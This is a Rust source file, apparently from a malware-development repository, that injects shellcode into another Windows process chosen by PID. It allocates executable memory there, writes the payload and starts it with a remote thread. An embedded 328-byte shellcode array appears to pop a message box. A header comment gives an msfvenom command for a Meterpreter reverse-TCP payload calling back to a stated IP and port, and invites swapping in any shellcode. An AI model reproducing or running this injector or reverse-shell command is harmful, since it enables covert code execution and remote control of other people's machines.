/*

    For more Rust Codes : https://github.com/Whitecat18/Rust-for-Malware-Development.git

    Code to inject and execute shellcode into a remote process specified by its PID that runs in the same process PID !.
    This is just an Example demo i have written in. you can create your own shellcode you need! . This program allows all kinds of shellcode !

    Example i used to generate dummy shellcode for just Demo purpuse . you can use the same format!

    `
    msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.102.93 LPORT=4444 EXITFUNC=thread -f raw --var-name=Smukx -o shellcode.bin
    `
    By Smukx

*/
const OKI: &str = "[+]";
// const MIS: &str = "[-]";

use std::{env::args, ptr::null_mut, u64::MIN};

//ntdef::NULL
use winapi::{
    shared::minwindef::LPVOID,
    um::{
        errhandlingapi::GetLastError,
        handleapi::CloseHandle,
        memoryapi::{VirtualAllocEx, WriteProcessMemory},
        processthreadsapi::{CreateRemoteThreadEx, OpenProcess},
        synchapi::WaitForSingleObject,
        winbase::INFINITE,
        winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS},
    },
};

// type LpthreadStartRoutine = unsafe extern "system" fn(lp_parameter: LPVOID) -> DWORD;

fn main() {
    let pid_inp = args().collect::<Vec<String>>();

    if pid_inp.len() != 2 {
        panic!("{} Provide Proper PID", OKI);
    }

    let pid = pid_inp[1].parse::<u32>().expect("Provide Proper input !");
    println!("{} PID: {}", OKI, pid);

    let shellcode: [u8; 328] = [ 
        0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
        0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
        0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,
        0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,
        0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
        0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
        0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,
        0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,
        0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,
        0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
        0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
        0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
        0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,
        0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,
        0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,
        0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,
        0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,
        0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,
        0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x3e,
        0x48,0x8d,0x8d,0x30,0x01,0x00,0x00,0x41,0xba,0x4c,0x77,0x26,
        0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,
        0x8d,0x95,0x0e,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x24,0x01,
        0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
        0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,
        0x48,0x65,0x79,0x20,0x6d,0x61,0x6e,0x2e,0x20,0x49,0x74,0x73,
        0x20,0x6d,0x65,0x20,0x53,0x6d,0x75,0x6b,0x78,0x00,0x6b,0x6e,
        0x6f,0x63,0x6b,0x2d,0x6b,0x6e,0x6f,0x63,0x6b,0x00,0x75,0x73,
        0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00
    ];

    unsafe {
        let process = OpenProcess(PROCESS_ALL_ACCESS, false as i32, pid);

        if process.is_null() {
            panic!("{} Failed to create an Process {}", MIN, GetLastError());
        }

        println!("{} Process Has been allocated: {:?}", OKI, process);

        let buffer = VirtualAllocEx(
            process,
            null_mut(),
            shellcode.len(),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        );

        if buffer.is_null() {
            panic!(
                "{} Failed to Allocate to Process Mem. Error: {}",
                OKI,
                GetLastError()
            );
        }

        println!("{} Allocated Buffer sise: {:?}", OKI, buffer);

        let mut bytes: usize = 0;

        let result = WriteProcessMemory(
            process,
            buffer,
            shellcode.as_ptr() as LPVOID,
            shellcode.len(),
            &mut bytes,
        );

        if result == 0 || bytes != shellcode.len() {
            panic!(
                "{} Failed to write the shellcode to the remote process. Error:{}",
                OKI,
                GetLastError()
            );
        }

        // dummy thread id -> Found an alternet way !!
        // let tid: DWORD = NULL;
        let rem_thread = CreateRemoteThreadEx(
            process,
            null_mut(),
            0,
            std::mem::transmute(buffer),
            null_mut(),
            0,
            null_mut(),
            null_mut(),
        );

        if rem_thread.is_null() {
            panic!(
                "{} Failed to create remote thread. Error : {}",
                OKI,
                GetLastError()
            );
        }

        println!(
            "{} Got an Handle to the Remote thread: {:?}",
            OKI, rem_thread
        );

        WaitForSingleObject(rem_thread, INFINITE);
        CloseHandle(rem_thread);
        println!("{} Cleaning UP Thread ", OKI);
        CloseHandle(process);
        println!("{} Cleaning UP Process", OKI);
    }
}
